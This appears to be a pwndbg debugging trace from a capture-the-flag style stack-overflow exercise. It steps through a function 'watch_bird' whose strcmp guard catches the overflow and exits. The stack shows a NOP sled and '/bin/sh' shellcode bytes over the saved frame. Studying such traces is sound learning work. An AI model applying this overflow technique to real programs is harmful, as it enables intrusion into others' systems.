+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x0
+ ECX  0x8d
+ EDX  0x804b000 ◂— 0x0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d0 —▸ 0x804b000 ◂— 0x0
+ EIP  0x8048757 (watch_bird+100) ◂— add    esp, 0x10
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048748 <watch_bird+85>     sub    esp, 8
+   0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+ ► 0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+    ↓
+   0x8048766 <watch_bird+115>    sub    esp, 0xc
+   0x8048769 <watch_bird+118>    push   0x8048885
+   0x804876e <watch_bird+123>    call   puts@plt <0x80484c0>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0x804b000 ◂— 0x0
+01:0004│      0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048757 watch_bird+100
+   f 1 68732f6e
+pwndbg> n
+0x0804875a in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x0
+ ECX  0x8d
+ EDX  0x804b000 ◂— 0x0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x804875a (watch_bird+103) ◂— test   eax, eax
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804874b <watch_bird+88>     lea    eax, [ebp - 0x10]
+   0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+ ► 0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+    ↓
+   0x8048766 <watch_bird+115>    sub    esp, 0xc
+   0x8048769 <watch_bird+118>    push   0x8048885
+   0x804876e <watch_bird+123>    call   puts@plt <0x80484c0>
+ 
+   0x8048773 <watch_bird+128>    add    esp, 0x10
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804875a watch_bird+103
+   f 1 68732f6e
+pwndbg> n
+0x0804875c in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x0
+ ECX  0x8d
+ EDX  0x804b000 ◂— 0x0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x804875c (watch_bird+105) ◂— jne    0x8048766
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804874e <watch_bird+91>     push   eax
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+ ► 0x804875c <watch_bird+105>  ✔ jne    watch_bird+115 <0x8048766>
+    ↓
+   0x8048766 <watch_bird+115>    sub    esp, 0xc
+   0x8048769 <watch_bird+118>    push   0x8048885
+   0x804876e <watch_bird+123>    call   puts@plt <0x80484c0>
+ 
+   0x8048773 <watch_bird+128>    add    esp, 0x10
+   0x8048776 <watch_bird+131>    sub    esp, 0xc
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804875c watch_bird+105
+   f 1 68732f6e
+pwndbg> n
+0x08048766 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x0
+ ECX  0x8d
+ EDX  0x804b000 ◂— 0x0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EIP  0x8048766 (watch_bird+115) ◂— sub    esp, 0xc
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x804874f <watch_bird+92>     push   dword ptr [ebp + 8]
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+    ↓
+ ► 0x8048766 <watch_bird+115>    sub    esp, 0xc
+   0x8048769 <watch_bird+118>    push   0x8048885
+   0x804876e <watch_bird+123>    call   puts@plt <0x80484c0>
+ 
+   0x8048773 <watch_bird+128>    add    esp, 0x10
+   0x8048776 <watch_bird+131>    sub    esp, 0xc
+   0x8048779 <watch_bird+134>    push   -1
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+01:0004│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048766 watch_bird+115
+   f 1 68732f6e
+pwndbg> n
+0x08048769 in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x0
+ ECX  0x8d
+ EDX  0x804b000 ◂— 0x0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+ EIP  0x8048769 (watch_bird+118) ◂— push   0x8048885
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048752 <watch_bird+95>     call   strcmp@plt <0x8048440>
+ 
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+    ↓
+   0x8048766 <watch_bird+115>    sub    esp, 0xc
+ ► 0x8048769 <watch_bird+118>    push   0x8048885
+   0x804876e <watch_bird+123>    call   puts@plt <0x80484c0>
+ 
+   0x8048773 <watch_bird+128>    add    esp, 0x10
+   0x8048776 <watch_bird+131>    sub    esp, 0xc
+   0x8048779 <watch_bird+134>    push   -1
+   0x804877b <watch_bird+136>    call   exit@plt <0x80484d0>
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+01:0004│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+02:0008│      0xffffc4dc ◂— 0x2710
+03:000c│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+04:0010│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  8048769 watch_bird+118
+   f 1 68732f6e
+pwndbg> n
+0x0804876e in watch_bird ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────[ REGISTERS ]─────────────────────────────────────
+ EAX  0xffffffff
+ EBX  0x0
+ ECX  0x8d
+ EDX  0x804b000 ◂— 0x0
+ EDI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ ESI  0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+ EBP  0xffffc588 ◂— 0x69622fff
+ ESP  0xffffc4d0 —▸ 0x8048885 ◂— ja     0x80488e8 /* 'wait what you doing?!' */
+ EIP  0x804876e (watch_bird+123) —▸ 0xfffd4de8 ◂— 0x0
+──────────────────────────────────────[ DISASM ]──────────────────────────────────────
+   0x8048757 <watch_bird+100>    add    esp, 0x10
+   0x804875a <watch_bird+103>    test   eax, eax
+   0x804875c <watch_bird+105>    jne    watch_bird+115 <0x8048766>
+    ↓
+   0x8048766 <watch_bird+115>    sub    esp, 0xc
+   0x8048769 <watch_bird+118>    push   0x8048885
+ ► 0x804876e <watch_bird+123>    call   puts@plt <0x80484c0>
+        s: 0x8048885 ◂— 'wait what you doing?!'
+ 
+   0x8048773 <watch_bird+128>    add    esp, 0x10
+   0x8048776 <watch_bird+131>    sub    esp, 0xc
+   0x8048779 <watch_bird+134>    push   -1
+   0x804877b <watch_bird+136>    call   exit@plt <0x80484d0>
+ 
+   0x8048780 <watch_bird+141>    sub    esp, 0xc
+──────────────────────────────────────[ STACK ]───────────────────────────────────────
+00:0000│ esp  0xffffc4d0 —▸ 0x8048885 ◂— ja     0x80488e8 /* 'wait what you doing?!' */
+01:0004│      0xffffc4d4 —▸ 0xffffc578 ◂— 0xcd0c568d
+02:0008│      0xffffc4d8 —▸ 0xffffc598 —▸ 0xffffc5b8 ◂— 0x0
+03:000c│      0xffffc4dc ◂— 0x2710
+04:0010│      0xffffc4e0 —▸ 0xf7fc7000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
+05:0014│      0xffffc4e4 ◂— 0x90909090
+... ↓
+────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────
+ ► f 0  804876e watch_bird+123
+   f 1 68732f6e
+pwndbg> 
